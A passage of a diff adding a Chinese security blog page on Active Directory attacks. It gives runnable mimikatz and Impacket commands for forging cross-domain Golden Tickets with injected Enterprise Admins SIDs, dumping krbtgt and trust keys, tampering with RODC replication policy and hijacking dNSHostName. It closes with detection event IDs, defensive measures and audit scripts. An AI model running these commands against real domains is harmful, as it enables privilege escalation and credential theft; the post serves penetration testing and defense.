+<td>双向可传递</td>
+<td>子林→根林</td>
+<td>Inter-Realm TGT</td>
+</tr>
+<tr>
+<td>External</td>
+<td>不可传递</td>
+<td>受信任域→信任域</td>
+<td>SID History + 信任密钥</td>
+</tr>
+<tr>
+<td>Forest</td>
+<td>双向可传递</td>
+<td>任意方向</td>
+<td>TGT跨林委派</td>
+</tr>
+</tbody></table>
+<pre class="mermaid">flowchart TD
+    subgraph 父域 ad.local
+        EA[Enterprise Admins]
+        DC1[DC01]
+    end
+    subgraph 子域 child.ad.local
+        DA[Domain Admins]
+        KRBTGT2[krbtgt Hash]
+    end
+    DA -->|提取krbtgt哈希| KRBTGT2
+    KRBTGT2 -->|"伪造Golden Ticket\n注入EA SID"| EA
+    DA -->|利用信任密钥| DC1</pre>
+
+<p><strong>子域→父域提权实战：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取子域krbtgt哈希和SID</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:child.ad.local /user:krbtgt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取父域Enterprise Admins组SID</span></span><br><span class="line"><span class="built_in">Get-DomainGroup</span> <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> <span class="literal">-Domain</span> ad.local | <span class="built_in">Select</span> objectsid</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mimikatz注入SID History伪造跨域Golden Ticket</span></span><br><span class="line">mimikatz <span class="comment"># kerberos::golden /user:Administrator /domain:child.ad.local \</span></span><br><span class="line">    /sid:S<span class="literal">-1-5-21-</span>&lt;child<span class="literal">-sid</span>&gt; /sids:S<span class="literal">-1-5-21-</span>&lt;parent<span class="literal">-sid</span>&gt;<span class="literal">-519</span> \</span><br><span class="line">    /krbtgt:&lt;krbtgt<span class="literal">-hash</span>&gt; /ptt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证跨域EA权限</span></span><br><span class="line"><span class="built_in">dir</span> \\dc01.ad.local\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Impacket ticketer.py伪造跨域票据</span></span><br><span class="line">python3 ticketer.py -domain child.ad.local -domain-sid S-1-5-21-&lt;child-sid&gt; \</span><br><span class="line">    -extra-sid S-1-5-21-&lt;parent-sid&gt;-519 -nthash &lt;krbtgt-hash&gt; administrator</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 wmiexec.py administrator@dc01.ad.local -k -no-pass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取信任密钥</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::trust /patch</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="十、RODC-攻击"><a href="#十、RODC-攻击" class="headerlink" title="十、RODC 攻击"></a>十、RODC 攻击</h2><p>RODC部署在物理安全性低的分支机构，凭据默认不缓存，除非密码复制策略（PRP）明确允许。攻击面包括：<code>msDS-RevealOnDemandGroup</code>成员可读缓存凭据、<code>ManagedBy</code>属性的用户对RODC有特殊控制权、Revealed List暴露已缓存凭据的用户。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看RODC密码复制策略与已缓存凭据</span></span><br><span class="line"><span class="built_in">Get-ADDomainController</span> <span class="literal">-Filter</span> &#123;IsReadOnly <span class="operator">-eq</span> <span class="variable">$true</span>&#125; <span class="literal">-Properties</span> `</span><br><span class="line">    msDS<span class="literal">-RevealOnDemandGroup</span>, msDS<span class="literal">-NeverRevealGroup</span>, msDS<span class="literal">-RevealedUsers</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看RODC管理者</span></span><br><span class="line"><span class="built_in">Get-ADDomainController</span> <span class="literal">-Filter</span> &#123;IsReadOnly <span class="operator">-eq</span> <span class="variable">$true</span>&#125; <span class="literal">-Properties</span> ManagedBy</span><br><span class="line"></span><br><span class="line"><span class="comment"># ManagedBy用户可修改RODC复制策略</span></span><br><span class="line"><span class="built_in">Set-ADComputer</span> <span class="literal">-Identity</span> RODC01<span class="variable">$</span> <span class="literal">-Add</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    <span class="string">&#x27;msDS-RevealOnDemandGroup&#x27;</span> = <span class="string">&#x27;CN=Domain Admins,CN=Users,DC=ad,DC=local&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>dNSHostName劫持：</strong> RODC计算机对象ACL通常较宽松，修改<code>dNSHostName</code>可将认证流量重定向至攻击者主机实施中间人攻击：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> RODC01 <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;dNSHostName=<span class="string">&#x27;attacker.ad.local&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># 攻击者主机启动伪装LDAP/Kerberos服务中继凭据</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="十一、检测与防御"><a href="#十一、检测与防御" class="headerlink" title="十一、检测与防御"></a>十一、检测与防御</h2><table>
+<thead>
+<tr>
+<th>攻击技术</th>
+<th>关键检测指标</th>
+<th>事件ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SharpHound采集</td>
+<td>短时间大量LDAP查询</td>
+<td>1644</td>
+</tr>
+<tr>
+<td>DCSync</td>
+<td>DS-Replication权限使用</td>
+<td>4662</td>
+</tr>
+<tr>
+<td>DCShadow</td>
+<td>伪DC注册&#x2F;删除SPN</td>
+<td>4742&#x2F;3076</td>
+</tr>
+<tr>
+<td>ACL滥用</td>
+<td>非授权ACL修改</td>
+<td>5136&#x2F;4670</td>
+</tr>
+<tr>
+<td>AdminSDHolder</td>
+<td>AdminSDHolder ACL变更</td>
+<td>5136</td>
+</tr>
+<tr>
+<td>LAPS读取</td>
+<td>ms-Mcs-AdmPwd属性查询</td>
+<td>4662</td>
+</tr>
+<tr>
+<td>跨域攻击</td>
+<td>跨域TGT使用</td>
+<td>4769</td>
+</tr>
+</tbody></table>
+<p><strong>防御策略：</strong></p>
+<ol>
+<li><strong>最小权限</strong>：审计DCSync&#x2F;WriteDacl等敏感权限，利用BloodHound定期自查</li>
+<li><strong>LAPS全覆盖</strong>：消除固定本地管理员密码，避免横向移动凭据复用</li>
+<li><strong>凭据保护</strong>：启用Credential Guard、Remote Credential Guard、Protected Users组</li>
+<li><strong>SYSVOL监控</strong>：限制GPO修改权限，监测SYSVOL异常文件变更</li>
+<li><strong>RODC硬化</strong>：严格PRP策略，禁止高权限凭据缓存到RODC</li>
+<li><strong>SID过滤</strong>：确保跨林信任启用SID过滤，阻断SID History跨林注入</li>
+<li><strong>日志集中</strong>：关联分析域控安全日志，建立攻击行为基线</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自查：列出所有非标准DCSync权限持有者</span></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-SearchBase</span> <span class="string">&quot;DC=ad,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> |</span><br><span class="line">    <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.ObjectAceType <span class="operator">-match</span> <span class="string">&#x27;DS-Replication-Get-Changes&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 审计AdminSDHolder ACL</span></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-Identity</span> <span class="string">&quot;CN=AdminSDHolder,CN=System,DC=ad,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> |</span><br><span class="line">    <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.SecurityIdentifierName <span class="operator">-notmatch</span> <span class="string">&#x27;^(NT AUTHORITY|BUILTIN)&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="十二、总结"><a href="#十二、总结" class="headerlink" title="十二、总结"></a>十二、总结</h2><p>从SharpHound绘制攻击图谱，到DCSync提取凭据、DCShadow植入后门，再到ACL滥用、GPO劫持、AdminSDHolder持久化——Active Directory攻击面盘根错节。防御方需以”假设已遭入侵”的视角持续监控、定期审计、最小化权限暴露面。</p>
+<hr>
+<p><strong>免责声明</strong>：本文所述技术仅供安全研究、授权渗透测试和防御建设参考。未经系统所有者明确书面授权在任何环境中使用这些技术均属违法行为。作者及发布平台不对因误用本文信息导致的任何直接或间接损失承担法律责任。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/File-upload-extension-bypass/" rel="prev" title="文件上传漏洞：后缀名绕过大全">
+                  <i class="fa fa-angle-left"></i> 文件上传漏洞：后缀名绕过大全
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/xss-tips/" rel="next" title="XSS 绕过 WAF 的几个思路">
+                  XSS 绕过 WAF 的几个思路 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
